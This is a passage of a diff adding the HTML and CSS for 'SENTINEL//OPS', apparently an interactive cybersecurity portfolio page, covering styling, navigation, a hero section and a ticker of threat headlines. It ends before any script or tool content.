@@ -1,0 +1,1096 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!--
+╔══════════════════════════════════════════════════════════════════╗
+║  SENTINEL//OPS — Interactive Cybersecurity Field Manual           ║
+║  Built with: vanilla HTML/CSS/JS + Three.js. No frameworks.       ║
+║                                                                     ║
+║  HOW TO MAKE THIS YOURS:                                            ║
+║  1. Search for `const CFG` below and edit name/email/links.       ║
+║  2. Push to GitHub → Settings → Pages → Deploy from /main.        ║
+║  3. Use the "Showcase Kit" section on the page to copy your       ║
+║     LinkedIn post and README blurb.                                 ║
+╚══════════════════════════════════════════════════════════════════╝
+-->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SENTINEL//OPS — Break it. Read it. Defend it.</title>
+<meta name="description" content="A story-driven, 3D cybersecurity operations experience — attacker kill chain vs blue-team defense, 40+ real tools across 8 domains, live console and secure login demo.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600&family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+/* ============ TOKENS ============ */
+:root{
+  --bg:#04070c; --bg2:#070c14; --panel:#0a121c; --panel2:#0c1622;
+  --line:rgba(89,255,163,.14); --line2:rgba(89,255,163,.28);
+  --gr:#45ffa1; --gr-dim:#1d7a4f; --red:#ff4d5e; --amber:#ffb454; --cyan:#5ad7ff;
+  --txt:#cfe0d6; --mut:#6f8379; --mut2:#9db3a6;
+  --disp:'Chakra Petch',sans-serif; --body:'Space Grotesk',sans-serif; --mono:'JetBrains Mono',monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--txt);font-family:var(--body);font-size:16px;line-height:1.6;overflow-x:hidden}
+::selection{background:var(--gr);color:#04120a}
+::-webkit-scrollbar{width:10px;height:10px}
+::-webkit-scrollbar-track{background:var(--bg2)}
+::-webkit-scrollbar-thumb{background:#123322;border:2px solid var(--bg2);border-radius:6px}
+::-webkit-scrollbar-thumb:hover{background:var(--gr-dim)}
+a{color:var(--gr);text-decoration:none}
+button{font-family:inherit;cursor:pointer}
+img{max-width:100%}
+
+/* film grain + scanlines */
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:2000;opacity:.05;
+  background:repeating-linear-gradient(0deg,transparent 0 2px,rgba(120,255,180,.5) 2px 3px,transparent 3px 4px);
+  mix-blend-mode:overlay}
+body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:2001;opacity:.06;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='140'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='2'/%3E%3C/filter%3E%3Crect width='140' height='140' filter='url(%23n)' opacity='1'/%3E%3C/svg%3E")}
+
+/* ============ UTILITIES ============ */
+.wrap{max-width:1240px;margin:0 auto;padding:0 24px}
+.mono{font-family:var(--mono)}
+.eyebrow{font-family:var(--mono);font-size:.72rem;letter-spacing:.32em;text-transform:uppercase;color:var(--gr);display:flex;align-items:center;gap:12px}
+.eyebrow::before{content:"";width:34px;height:1px;background:var(--gr)}
+h2.sec{font-family:var(--disp);font-weight:700;font-size:clamp(1.9rem,4.4vw,3.3rem);line-height:1.05;text-transform:uppercase;color:#eafff3;letter-spacing:.01em;margin:.5rem 0 1rem}
+.sec-sub{color:var(--mut2);max-width:64ch}
+.frame{position:relative;border:1px solid var(--line);background:linear-gradient(180deg,var(--panel),var(--bg2))}
+.frame::before,.frame::after{content:"";position:absolute;width:16px;height:16px;border:1px solid var(--gr);z-index:2}
+.frame::before{top:-1px;left:-1px;border-right:0;border-bottom:0}
+.frame::after{bottom:-1px;right:-1px;border-left:0;border-top:0}
+.btn{display:inline-flex;align-items:center;gap:10px;font-family:var(--mono);font-size:.8rem;letter-spacing:.14em;text-transform:uppercase;
+  color:var(--gr);background:transparent;border:1px solid var(--line2);padding:.85rem 1.4rem;position:relative;transition:.25s}
+.btn:hover,.btn:focus-visible{background:var(--gr);color:#04120a;border-color:var(--gr);box-shadow:0 0 28px rgba(69,255,161,.35);outline:none}
+.btn.red{color:var(--red);border-color:rgba(255,77,94,.4)}
+.btn.red:hover{background:var(--red);color:#160308;box-shadow:0 0 28px rgba(255,77,94,.35)}
+.btn.solid{background:var(--gr);color:#04120a;border-color:var(--gr)}
+.btn.solid:hover{background:#7dffc0}
+.chip{display:inline-block;font-family:var(--mono);font-size:.66rem;letter-spacing:.16em;text-transform:uppercase;padding:3px 10px;border:1px solid var(--line2);color:var(--mut2)}
+.chip.gr{color:var(--gr);border-color:rgba(69,255,161,.4)}
+.chip.rd{color:var(--red);border-color:rgba(255,77,94,.4)}
+.chip.am{color:var(--amber);border-color:rgba(255,180,84,.4)}
+.chip.cy{color:var(--cyan);border-color:rgba(90,215,255,.4)}
+.rv{opacity:0;transform:translateY(26px);transition:opacity .7s ease,transform .7s ease}
+.rv.in{opacity:1;transform:none}
+.d1{transition-delay:.08s}.d2{transition-delay:.16s}.d3{transition-delay:.24s}.d4{transition-delay:.32s}
+kbd{font-family:var(--mono);font-size:.72rem;border:1px solid var(--line2);border-bottom-width:2px;padding:1px 7px;color:var(--mut2);background:var(--panel)}
+
+/* ============ BOOT OVERLAY ============ */
+#boot{position:fixed;inset:0;background:#020408;z-index:4000;display:flex;align-items:center;justify-content:center;transition:opacity .5s}
+#boot.off{opacity:0;pointer-events:none}
+#boot pre{font-family:var(--mono);font-size:.8rem;color:var(--gr);line-height:2;min-width:min(480px,86vw);text-shadow:0 0 12px rgba(69,255,161,.5)}
+#boot .skip{position:absolute;bottom:28px;font-family:var(--mono);font-size:.66rem;color:var(--mut);letter-spacing:.3em}
+
+/* ============ NAV ============ */
+nav{position:fixed;top:0;left:0;right:0;z-index:1500;background:rgba(4,7,12,.92);border-bottom:1px solid var(--line)}
+.nav-in{max-width:1400px;margin:0 auto;display:flex;align-items:center;gap:22px;padding:0 22px;height:60px}
+.logo{font-family:var(--mono);font-weight:700;font-size:.95rem;color:#eafff3;letter-spacing:.06em;white-space:nowrap}
+.logo b{color:var(--gr)}
+.logo .blk{display:inline-block;width:9px;height:15px;background:var(--gr);vertical-align:-2px;animation:blink 1.1s steps(1) infinite;margin-left:2px}
+.nav-links{display:flex;gap:4px;margin-left:auto}
+.nav-links a{font-family:var(--mono);font-size:.68rem;letter-spacing:.18em;text-transform:uppercase;color:var(--mut2);padding:8px 11px;border:1px solid transparent;transition:.2s}
+.nav-links a:hover{color:var(--gr);border-color:var(--line2)}
+.nav-status{display:flex;align-items:center;gap:14px;font-family:var(--mono);font-size:.66rem;color:var(--mut2);white-space:nowrap}
+.dot{width:8px;height:8px;background:var(--gr);border-radius:50%;box-shadow:0 0 10px var(--gr);animation:pulse 2s infinite}
+#menuBtn{display:none;margin-left:auto;background:none;border:1px solid var(--line2);color:var(--gr);font-family:var(--mono);font-size:.7rem;padding:8px 14px;letter-spacing:.2em}
+.nav-drop{display:none;position:fixed;top:60px;left:0;right:0;background:var(--bg2);border-bottom:1px solid var(--line2);z-index:1499;padding:10px 0}
+.nav-drop a{display:block;padding:12px 26px;font-family:var(--mono);font-size:.78rem;letter-spacing:.2em;text-transform:uppercase;color:var(--mut2)}
+.nav-drop a:hover{color:var(--gr);background:var(--panel)}
+.nav-drop.open{display:block}
+
+/* ============ HERO ============ */
+#top{position:relative;min-height:100vh;display:flex;align-items:center;padding:110px 0 40px;overflow:hidden;
+  background:radial-gradient(1100px 600px at 78% 30%,rgba(20,60,40,.35),transparent 60%),var(--bg)}
+#globe{position:absolute;inset:0;z-index:0}
+#globe::after{content:"";position:absolute;inset:0;background:linear-gradient(90deg,var(--bg) 6%,transparent 45%,transparent 75%,rgba(4,7,12,.6))}
+.hero-grid{position:relative;z-index:2;display:grid;grid-template-columns:1.15fr .85fr;gap:44px;align-items:center;width:100%}
+.hero-eyebrow{font-family:var(--mono);font-size:.7rem;letter-spacing:.34em;color:var(--gr);text-transform:uppercase;display:flex;gap:14px;align-items:center}
+.hero-eyebrow .tag{color:var(--mut);letter-spacing:.2em}
+h1{font-family:var(--disp);font-weight:700;text-transform:uppercase;font-size:clamp(2.3rem,5.6vw,4.5rem);line-height:1.02;color:#eafff3;margin:20px 0 18px;min-height:2.1em}
+h1 .rd{color:var(--red)} h1 .gn{color:var(--gr)}
+.hero-sub{color:var(--mut2);max-width:56ch;margin-bottom:28px}
+.hero-sub b{color:var(--txt)}
+.hero-cta{display:flex;gap:14px;flex-wrap:wrap}
+.hero-stats{display:flex;gap:0;margin-top:44px;border:1px solid var(--line);background:rgba(7,12,20,.8)}
+.hstat{flex:1;padding:16px 18px;border-right:1px solid var(--line)}
+.hstat:last-child{border-right:0}
+.hstat .n{font-family:var(--disp);font-size:1.7rem;font-weight:700;color:var(--gr)}
+.hstat .n.rd{color:var(--red)}.hstat .n.am{color:var(--amber)}
+.hstat .l{font-family:var(--mono);font-size:.6rem;letter-spacing:.2em;text-transform:uppercase;color:var(--mut)}
+
+/* live feed panel */
+.feed{background:rgba(6,11,18,.92);border:1px solid var(--line2);box-shadow:0 30px 80px rgba(0,0,0,.5)}
+.feed-head{display:flex;align-items:center;gap:10px;padding:11px 16px;border-bottom:1px solid var(--line);font-family:var(--mono);font-size:.68rem;letter-spacing:.16em;color:var(--mut2)}
+.feed-head .sq{width:9px;height:9px}
+.feed-head .sq.r{background:var(--red)}.sq.a{background:var(--amber)}.sq.g{background:var(--gr)}
+.feed-head .clock{margin-left:auto;color:var(--gr)}
+.feed-body{height:320px;overflow:hidden;padding:14px 16px;display:flex;flex-direction:column;justify-content:flex-end;font-family:var(--mono);font-size:.72rem;line-height:1.9}
+.fl{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;opacity:.85}
+.fl .t{color:var(--mut)} .fl.ok{color:#8fe6b3}.fl.warn{color:var(--amber)}.fl.crit{color:var(--red)}.fl.sys{color:var(--cyan)}
+.feed-foot{border-top:1px solid var(--line);padding:8px 16px;font-family:var(--mono);font-size:.62rem;color:var(--mut);letter-spacing:.14em;display:flex;justify-content:space-between}
+.caret{display:inline-block;width:8px;height:13px;background:var(--gr);animation:blink 1s steps(1) infinite;vertical-align:-2px}
+
+/* ============ TICKER ============ */
+.ticker{border-top:1px solid var(--line);border-bottom:1px solid var(--line);background:var(--bg2);overflow:hidden;position:relative}
+.ticker-track{display:flex;gap:0;width:max-content;animation:tick 46s linear infinite;padding:11px 0}
+.ticker:hover .ticker-track{animation-play-state:paused}
+.ticker span{font-family:var(--mono);font-size:.7rem;letter-spacing:.12em;color:var(--mut2);padding:0 26px;border-right:1px solid var(--line);white-space:nowrap}
+.ticker b.crit{color:var(--red)}.ticker b.warn{color:var(--amber)}.ticker b.ok{color:var(--gr)}
+
+/* ============ SECTIONS ============ */
+section.blk{padding:110px 0;position:relative}
+section.blk.alt{background:var(--bg2)}
+.sec-head{margin-bottom:56px}
+
+/* STORY — sticky two-column */
+.story-grid{display:grid;grid-template-columns:340px 1fr;gap:60px;align-items:start}
+.story-stick{position:sticky;top:100px}
+.ss-time{font-family:var(--disp);font-weight:700;font-size:clamp(2.2rem,4vw,3.4rem);color:var(--red);line-height:1;transition:.3s}
+.ss-title{font-family:var(--mono);letter-spacing:.3em;font-size:.78rem;color:#eafff3;text-transform:uppercase;margin:14px 0 8px}
+.ss-count{font-family:var(--mono);font-size:.66rem;color:var(--mut);letter-spacing:.2em}
+.ss-meter{margin-top:26px;height:3px;background:var(--panel2);position:relative;overflow:hidden}
+.ss-meter i{position:absolute;inset:0;background:linear-gradient(90deg,var(--red),var(--amber),var(--gr));transform-origin:left;transform:scaleX(0);transition:transform .4s}
+.beats{display:flex;flex-direction:column;gap:26px;position:relative;padding-left:34px}
+.beats::before{content:"";position:absolute;left:9px;top:8px;bottom:8px;width:1px;background:linear-gradient(180deg,var(--red),var(--amber) 62%,var(--gr))}
+.beat{position:relative}
+.beat::before{content:"";position:absolute;left:-30px;top:20px;width:11px;height:11px;background:var(--bg);border:2px solid var(--red);transform:rotate(45deg)}
+.beat.blue::before{border-color:var(--gr)}
+.beat-card{border:1px solid var(--line);background:var(--panel);padding:22px 24px;transition:.3s}
+.beat:hover .beat-card{border-color:var(--line2);transform:translateX(6px)}
+.beat-time{font-family:var(--mono);font-size:.66rem;letter-spacing:.22em;color:var(--red)}
+.beat.blue .beat-time{color:var(--gr)}
+.beat-card h4{font-family:var(--disp);text-transform:uppercase;font-size:1.05rem;color:#eafff3;margin:6px 0 8px;letter-spacing:.04em}
+.beat-card p{color:var(--mut2);font-size:.92rem}
+.beat-card pre{margin-top:14px;background:#050a10;border:1px solid var(--line);border-left:2px solid var(--red);padding:10px 14px;font-family:var(--mono);font-size:.68rem;color:#9fe8c0;overflow-x:auto}
+.beat.blue .beat-card pre{border-left-color:var(--gr)}
+.story-turn{margin-top:56px;text-align:center;font-family:var(--mono);font-size:.75rem;letter-spacing:.3em;color:var(--gr);border:1px dashed var(--line2);padding:20px}
+
+/* DUAL PATH */
+.duel{display:grid;grid-template-columns:1fr 300px 1fr;gap:0;margin-bottom:22px;border:1px solid var(--line);background:var(--panel)}
+.duel-core{padding:26px 22px;text-align:center;border-left:1px solid var(--line);border-right:1px solid var(--line);background:var(--bg2);display:flex;flex-direction:column;justify-content:center;gap:8px}
+.duel-num{font-family:var(--mono);font-size:.62rem;letter-spacing:.3em;color:var(--mut)}
+.duel-core h3{font-family:var(--disp);text-transform:uppercase;font-size:1.15rem;color:#eafff3}
+.duel-core p{font-size:.78rem;color:var(--mut)}
+.duel-side{padding:24px 26px;position:relative;transition:.3s}
+.duel-side h5{font-family:var(--mono);font-size:.64rem;letter-spacing:.28em;text-transform:uppercase;margin-bottom:12px;display:flex;align-items:center;gap:10px}
+.duel-side h5::before{content:"";width:22px;height:1px}
+.duel-side.red h5{color:var(--red)} .duel-side.red h5::before{background:var(--red)}
+.duel-side.blue h5{color:var(--gr)} .duel-side.blue h5::before{background:var(--gr)}
+.duel-side ul{list-style:none;display:flex;flex-direction:column;gap:9px}
+.duel-side li{font-size:.86rem;color:var(--mut2);padding-left:18px;position:relative}
+.duel-side li::before{content:"▸";position:absolute;left:0;font-size:.7rem;top:2px}
+.duel-side.red li::before{color:var(--red)} .duel-side.blue li::before{color:var(--gr)}
+.duel-side li code{font-family:var(--mono);font-size:.74rem;color:var(--amber);background:rgba(255,180,84,.07);padding:1px 6px}
+.duel-side.red:hover{background:rgba(255,77,94,.05)} .duel-side.blue:hover{background:rgba(69,255,161,.05)}
+.duel-legend{display:flex;gap:22px;justify-content:center;margin-bottom:36px;font-family:var(--mono);font-size:.66rem;letter-spacing:.22em;color:var(--mut2)}
+.duel-legend i{display:inline-block;width:10px;height:10px;margin-right:8px;transform:rotate(45deg)}
+
+/* radar */
+.radar{width:150px;height:150px;border-radius:50%;border:1px solid var(--line2);margin:0 auto;position:relative;overflow:hidden;
+  background:radial-gradient(circle,transparent 0 30%,rgba(69,255,161,.06) 30% 31%,transparent 31% 60%,rgba(69,255,161,.06) 60% 61%,transparent 61% 100%)}
+.radar::before{content:"";position:absolute;inset:0;border-radius:50%;background:conic-gradient(from 0deg,rgba(69,255,161,.5),transparent 70deg);animation:sweep 3.4s linear infinite}
+.radar::after{content:"";position:absolute;left:50%;top:50%;width:4px;height:4px;background:var(--gr);border-radius:50%;transform:translate(-50%,-50%)}
+.blip{position:absolute;width:5px;height:5px;border-radius:50%;background:var(--red);animation:blip 3.4s infinite}
+.blip.g{background:var(--gr)}
+
+/* ARSENAL */
+.tabs{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:34px}
+.tab{font-family:var(--mono);font-size:.68rem;letter-spacing:.16em;text-transform:uppercase;background:transparent;color:var(--mut2);
+  border:1px solid var(--line);padding:10px 16px;transition:.2s;display:flex;gap:9px;align-items:center}
+.tab .ico{font-size:.8rem}
+.tab:hover{color:var(--gr);border-color:var(--line2)}
+.tab.on{background:var(--gr);color:#04120a;border-color:var(--gr);box-shadow:0 0 22px rgba(69,255,161,.3)}
+.ars-panel{display:none;animation:fadeUp .45s ease}
+.ars-panel.on{display:block}
+.ars-desc{color:var(--mut2);font-size:.9rem;max-width:70ch;margin-bottom:26px;border-left:2px solid var(--gr);padding-left:16px}
+.tools{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}
+.tool{border:1px solid var(--line);background:var(--panel);padding:20px;transition:.3s;position:relative;overflow:hidden}
+.tool::before{content:"";position:absolute;top:0;left:0;width:100%;height:2px;background:linear-gradient(90deg,var(--gr),transparent);transform:scaleX(0);transform-origin:left;transition:.4s}
+.tool:hover{transform:translateY(-5px);border-color:var(--line2);box-shadow:0 18px 40px rgba(0,0,0,.4)}
+.tool:hover::before{transform:scaleX(1)}
+.tool h4{font-family:var(--disp);text-transform:uppercase;font-size:.98rem;color:#eafff3;display:flex;justify-content:space-between;align-items:center;gap:10px}
+.tool p{font-size:.82rem;color:var(--mut2);margin:10px 0 14px;min-height:3.2em}
+.tool code{display:block;font-family:var(--mono);font-size:.68rem;color:#9fe8c0;background:#050a10;border:1px solid var(--line);padding:9px 12px;overflow-x:auto;white-space:nowrap}
+.tool code::before{content:"$ ";color:var(--mut)}
+
+/* SKILLS */
+.skill-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:60px;align-items:start}
+.bar-row{margin-bottom:20px}
+.bar-top{display:flex;justify-content:space-between;font-family:var(--mono);font-size:.72rem;letter-spacing:.14em;text-transform:uppercase;margin-bottom:8px}
+.bar-top .pct{color:var(--gr)}
+.bar{height:7px;background:var(--panel2);border:1px solid var(--line);position:relative;overflow:hidden}
+.bar i{position:absolute;inset:0;width:0;background:linear-gradient(90deg,var(--gr-dim),var(--gr));transition:width 1.3s cubic-bezier(.2,.7,.2,1)}
+.bar-row.red .bar i{background:linear-gradient(90deg,#7a2030,var(--red))}
+.principles{display:flex;flex-wrap:wrap;gap:10px;margin-top:30px}
+.stamp{font-family:var(--disp);font-weight:700;font-size:.8rem;letter-spacing:.18em;text-transform:uppercase;color:var(--red);
+  border:2px solid rgba(255,77,94,.5);padding:8px 16px;transform:rotate(-1.5deg)}
+.stamp:nth-child(even){transform:rotate(1.2deg);color:var(--gr);border-color:rgba(69,255,161,.5)}
+.road{margin-top:36px;border-top:1px solid var(--line);padding-top:26px}
+.road h4{font-family:var(--mono);font-size:.7rem;letter-spacing:.28em;color:var(--mut2);text-transform:uppercase;margin-bottom:18px}
+.road-item{display:flex;gap:16px;align-items:center;padding:11px 0;border-bottom:1px dashed var(--line);font-size:.9rem}
+.road-item .st{margin-left:auto}
+
+/* CONSOLE */
+.term{background:#03070c;border:1px solid var(--line2);box-shadow:0 40px 100px rgba(0,0,0,.6)}
+.term-head{display:flex;align-items:center;gap:10px;padding:12px 18px;border-bottom:1px solid var(--line);background:var(--panel)}
+.term-body{height:380px;overflow-y:auto;padding:18px 20px;font-family:var(--mono);font-size:.76rem;line-height:1.85}
+.term-body .out-ok{color:#8fe6b3}.out-err{color:var(--red)}.out-sys{color:var(--cyan)}.out-am{color:var(--amber)}.out-dim{color:var(--mut)}
+.term-line{display:flex;gap:0}
+.term-line .ps{color:var(--gr);white-space:nowrap}
+#tIn{flex:1;background:none;border:none;outline:none;color:#eafff3;font-family:var(--mono);font-size:.76rem;caret-color:var(--gr)}
+.qcmds{display:flex;flex-wrap:wrap;gap:8px;margin-top:16px}
+.qcmd{font-family:var(--mono);font-size:.66rem;letter-spacing:.1em;background:var(--panel);border:1px solid var(--line);color:var(--mut2);padding:7px 12px;transition:.2s}
+.qcmd:hover{color:var(--gr);border-color:var(--gr)}
+
+/* LOGIN */
+.login-grid{display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:start}
+.edu li{list-style:none;padding:14px 0 14px 34px;border-bottom:1px dashed var(--line);position:relative;color:var(--mut2);font-size:.92rem}
+.edu li::before{content:attr(data-n);position:absolute;left:0;top:14px;font-family:var(--mono);font-size:.68rem;color:var(--gr)}
+.edu li b{color:var(--txt)}
+.login-box{padding:34px}
+.lb-row{margin-bottom:18px}
+.lb-row label{display:block;font-family:var(--mono);font-size:.64rem;letter-spacing:.24em;text-transform:uppercase;color:var(--mut2);margin-bottom:8px}
+.lb-row input{width:100%;background:#050a10;border:1px solid var(--line);color:#eafff3;font-family:var(--mono);font-size:.85rem;padding:13px 14px;outline:none;transition:.2s}
+.lb-row input:focus{border-color:var(--gr);box-shadow:0 0 0 3px rgba(69,255,161,.12)}
+.hashbox{font-family:var(--mono);font-size:.62rem;word-break:break-all;color:var(--cyan);background:#050a10;border:1px solid var(--line);padding:10px 12px;margin-top:8px;min-height:40px}
+.meter{display:flex;gap:5px;margin-top:10px}
+.meter i{height:4px;flex:1;background:var(--panel2)}
+.meter.s1 i:nth-child(1){background:var(--red)}
+.meter.s2 i:nth-child(-n+2){background:var(--amber)}
+.meter.s3 i:nth-child(-n+3){background:#c8f56a}
+.meter.s4 i{background:var(--gr)}
+.login-msg{font-family:var(--mono);font-size:.72rem;margin-top:14px;min-height:1.4em}
+.login-msg.err{color:var(--red)}.login-msg.ok{color:var(--gr)}
+.granted{display:none;text-align:left}
+.granted.on{display:block;animation:fadeUp .5s}
+.g-head{font-family:var(--disp);font-weight:700;font-size:1.7rem;color:var(--gr);letter-spacing:.06em;text-transform:uppercase;margin-bottom:6px}
+.g-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:20px 0}
+.g-card{border:1px solid var(--line2);padding:12px;text-align:center}
+.g-card .v{font-family:var(--disp);font-weight:700;font-size:1.2rem;color:var(--gr)}
+.g-card .k{font-family:var(--mono);font-size:.58rem;letter-spacing:.2em;color:var(--mut);text-transform:uppercase}
+.g-brief{font-size:.86rem;color:var(--mut2);border-left:2px solid var(--gr);padding-left:14px}
+
+/* CONTACT */
+.contact-grid{display:grid;grid-template-columns:.9fr 1.1fr;gap:60px;align-items:start}
+.chan{padding:16px 0;border-bottom:1px dashed var(--line);display:flex;justify-content:space-between;gap:16px;align-items:center}
+.chan .k{font-family:var(--mono);font-size:.64rem;letter-spacing:.24em;text-transform:uppercase;color:var(--mut)}
+.chan .v{font-family:var(--mono);font-size:.82rem;color:var(--gr);word-break:break-all}
+.copybtn{background:none;border:1px solid var(--line2);color:var(--mut2);font-family:var(--mono);font-size:.6rem;letter-spacing:.16em;padding:6px 10px;transition:.2s;white-space:nowrap}
+.copybtn:hover{color:#04120a;background:var(--gr);border-color:var(--gr)}
+.cform{padding:34px}
+.mail-prev{margin-top:20px;font-family:var(--mono);font-size:.68rem;color:var(--mut2);background:#050a10;border:1px solid var(--line);padding:14px;display:none;white-space:pre-wrap;word-break:break-word}
+.mail-prev.on{display:block;animation:fadeUp .4s}
+
+/* KIT */
+.kit-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.kit-card{padding:26px}
+.kit-card h4{font-family:var(--disp);text-transform:uppercase;color:#eafff3;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;gap:10px}
+.kit-card pre{font-family:var(--mono);font-size:.7rem;line-height:1.8;color:var(--mut2);background:#050a10;border:1px solid var(--line);padding:16px;max-height:300px;overflow:auto;white-space:pre-wrap}
+.steps{margin-top:30px;display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.step{border:1px solid var(--line);background:var(--panel);padding:18px;font-size:.84rem;color:var(--mut2)}
+.step b{display:block;font-family:var(--mono);font-size:.66rem;letter-spacing:.2em;color:var(--gr);margin-bottom:8px;text-transform:uppercase}
+
+/* FOOTER */
+footer{border-top:1px solid var(--line);background:#03060a;padding:70px 0 34px;position:relative;overflow:hidden}
+.foot-big{font-family:var(--disp);font-weight:700;text-transform:uppercase;font-size:clamp(2.4rem,7vw,5.4rem);line-height:.95;color:transparent;-webkit-text-stroke:1px rgba(69,255,161,.35);user-select:none}
+.foot-row{display:flex;flex-wrap:wrap;gap:20px;justify-content:space-between;align-items:center;margin-top:44px;border-top:1px dashed var(--line);padding-top:24px;font-family:var(--mono);font-size:.66rem;letter-spacing:.14em;color:var(--mut)}
+.foot-row a{color:var(--mut2)} .foot-row a:hover{color:var(--gr)}
+
+/* toast + matrix */
+#toast{position:fixed;bottom:26px;left:50%;transform:translateX(-50%) translateY(20px);z-index:3000;background:var(--panel);border:1px solid var(--gr);color:var(--gr);
+  font-family:var(--mono);font-size:.72rem;letter-spacing:.1em;padding:12px 22px;opacity:0;transition:.3s;pointer-events:none;box-shadow:0 10px 40px rgba(0,0,0,.6)}
+#toast.on{opacity:1;transform:translateX(-50%) translateY(0)}
+#toast.err{border-color:var(--red);color:var(--red)}
+#matrix{position:fixed;inset:0;z-index:2500;pointer-events:none;display:none;opacity:.5}
+
+/* keyframes */
+@keyframes blink{0%,49%{opacity:1}50%,100%{opacity:0}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+@keyframes tick{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+@keyframes sweep{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+@keyframes blip{0%,20%{opacity:0}25%{opacity:1}60%,100%{opacity:0}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
+
+/* responsive */
+@media(max-width:1020px){
+  .hero-grid,.story-grid,.skill-grid,.login-grid,.contact-grid,.kit-grid{grid-template-columns:1fr}
+  .story-stick{position:static;margin-bottom:20px}
+  .duel{grid-template-columns:1fr}
+  .duel-core{border:0;border-top:1px solid var(--line);border-bottom:1px solid var(--line);order:-1}
+  #globe{opacity:.5}
+}
+@media(max-width:860px){
+  .nav-links,.nav-status .hideS{display:none}
+  #menuBtn{display:block}
+  .hero-stats{flex-wrap:wrap}.hstat{min-width:45%}
+  section.blk{padding:80px 0}
+}
+@media (prefers-reduced-motion: reduce){
+  *,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important}
+  html{scroll-behavior:auto}
+  .ticker-track{animation:none}
+}
+</style>
+</head>
+<body>
+
+<!-- BOOT -->
+<div id="boot" aria-hidden="true">
+  <pre id="bootTxt"></pre>
+  <span class="skip">[ CLICK TO SKIP ]</span>
+</div>
+
+<canvas id="matrix" aria-hidden="true"></canvas>
+<div id="toast" role="status" aria-live="polite"></div>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-in">
+    <a class="logo" href="#top">▮ SENTINEL<b>//OPS</b><span class="blk"></span></a>
+    <div class="nav-links">
+      <a href="#story">Story</a><a href="#dual">Red×Blue</a><a href="#arsenal">Arsenal</a>
+      <a href="#skills">Skills</a><a href="#console">Console</a><a href="#login">Login</a><a href="#contact">Contact</a>
+    </div>
+    <div class="nav-status">
+      <span class="dot"></span><span class="hideS">NODE: ONLINE</span>
+      <span id="clock" class="hideS">00:00:00 UTC</span>
+    </div>
+    <button id="menuBtn" aria-label="menu">MENU</button>
+  </div>
+</nav>
+<div class="nav-drop" id="navDrop">
+  <a href="#story">Story</a><a href="#dual">Red×Blue</a><a href="#arsenal">Arsenal</a>
+  <a href="#skills">Skills</a><a href="#console">Console</a><a href="#login">Login</a><a href="#contact">Contact</a><a href="#kit">Showcase Kit</a>
+</div>
+
+<!-- HERO -->
+<header id="top">
+  <div id="globe" aria-hidden="true"></div>
+  <div class="wrap hero-grid">
+    <div>
+      <div class="hero-eyebrow">INTERACTIVE FIELD MANUAL <span class="tag">// v3.1 // BUILD 2026</span></div>
+      <h1 id="heroTitle">BREAK IT TO <span class="rd">UNDERSTAND</span> IT.<br>BUILD IT TO <span class="gn">DEFEND</span> IT.</h1>
+      <p class="hero-sub">Follow one breach end-to-end — from the attacker's first <b>Shodan ping</b> to the blue team's <b>T+47:00 containment</b> — and meet every real tool on both sides of the fight, across every domain of security.</p>
+      <div class="hero-cta">
+        <a class="btn solid" href="#story">[ ENTER THE STORY ]</a>
+        <a class="btn" href="#console">[ OPEN CONSOLE ]</a>
+      </div>
+      <div class="hero-stats">
+        <div class="hstat"><div class="n" data-count="40">0</div><div class="l">Real tools mapped</div></div>
+        <div class="hstat"><div class="n rd" data-count="7">0</div><div class="l">Kill-chain phases</div></div>
+        <div class="hstat"><div class="n am" data-count="8">0</div><div class="l">Security domains</div></div>
+        <div class="hstat"><div class="n" data-count="47">0</div><div class="l">Minutes to breach</div></div>
+      </div>
+    </div>
+    <div class="feed frame" aria-label="live threat feed simulation">
+      <div class="feed-head"><span class="sq r"></span><span class="sq a"></span><span class="sq g"></span>&nbsp;THREAT FEED — LIVE SIM <span class="clock" id="feedClock">--:--:--</span></div>
+      <div class="feed-body" id="feedBody"></div>
+      <div class="feed-foot"><span>src: honeypot-net / osint-relay</span><span>refresh 1.2s</span></div>
+    </div>
+  </div>
+</header>
+
+<!-- TICKER -->
+<div class="ticker" aria-hidden="true">
+  <div class="ticker-track" id="tickTrack">
+    <span><b class="crit">▲ CRIT</b> Credential-stuffing wave hitting exposed admin panels — rotate secrets now</span>
+    <span><b class="warn">◆ IOC</b> New phishing kit "VORTEX" — 1.2k lookalike domains registered this week</span>
+    <span><b class="ok">● PATCH</b> Critical RCE in edge router firmware — upgrade path published</span>
+    <span><b class="crit">▲ CRIT</b> LSASS dumping attempts detected across multiple orgs — enable protections</span>
+    <span><b class="warn">◆ INTEL</b> DNS-tunneling exfil technique trending in ransomware playbooks</span>
+    <span><b class="ok">● HUNT</b> MITRE ATT&CK technique T1078 (Valid Accounts) leads intrusions again</span>
